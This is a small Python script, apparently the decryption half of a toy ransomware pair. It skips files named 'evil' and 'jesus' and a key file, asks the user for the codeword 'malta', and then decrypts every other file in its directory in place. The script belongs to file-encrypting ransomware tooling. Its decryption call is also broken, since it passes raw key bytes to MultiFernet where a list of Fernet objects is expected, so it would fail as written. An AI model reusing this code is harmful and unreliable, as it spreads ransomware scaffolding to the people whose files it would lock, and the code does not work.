import os
from os.path import abspath, dirname

from cryptography.fernet import Fernet, MultiFernet


os.chdir(dirname(abspath(__file__)))
# cur_dir = dirname(abspath(__file__))

files = []
for file in os.listdir():
    if 'evil.py' == file:
        continue
    if 'jesus.py' == file:
        continue
    if 'evil.exe' == file:
        continue
    if 'jesus.exe' == file:
        continue
    if 'thekey.key' == file:
        continue
    if 'evil.bin' == file:
    	continue
    if 'jesus.bin' == file:
    	continue
    if os.path.isfile(file):
        files.append(file)

with open('thekey.key', 'rb') as f:
    key = content = f.read()

codeword = 'malta'

user_phrase = input('tell me ')

if user_phrase == codeword:
    for file in files:
        with open (file, 'rb') as f:
            content_encripted = f.read()
        content = MultiFernet(key).decrypt(content_encripted)
        with open (file, 'wb') as f:
            f.write(content)
